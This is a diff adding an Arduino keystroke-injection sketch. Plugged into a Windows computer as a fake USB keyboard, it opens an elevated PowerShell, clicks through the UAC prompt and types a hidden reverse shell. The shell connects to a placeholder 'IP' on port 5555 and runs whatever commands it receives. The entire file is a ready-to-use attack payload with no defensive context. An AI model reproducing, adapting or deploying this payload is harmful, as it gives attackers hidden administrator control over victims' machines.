@@ -1,0 +1,134 @@
+#include <Keyboard.h> 
+/*
+ * Developer @root_haxor !
+ */
+
+// Init function
+void setup()
+{
+  // Begining the stream
+  Keyboard.begin();
+
+  // Waiting 500ms for init
+  delay(500);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell");
+
+  delay(500);
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(3000);
+
+  typeKey(KEY_LEFT_ARROW);
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("PowerShell.exe -windowstyle hidden {");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("$client = [System.Net.Sockets.TCPClient]::new('IP', 5555)");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("[byte[]]$bytes = (0..65535).ForEach{ 0 }");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("$stream = $client.GetStream()");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("while ($i = $stream.Read($bytes, 0, $bytes.Length)) {");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $prompt = $sendback + 'PS ' + $PWD.Path + '> '");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $stream.Write($sendbyte, 0, $sendbyte.Length)");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("    $stream.Flush()");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("}");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("$client.Close()");
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  Keyboard.print("}");
+
+  typeKey(KEY_RETURN);
+
+}
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+// Unused
+void loop() {}
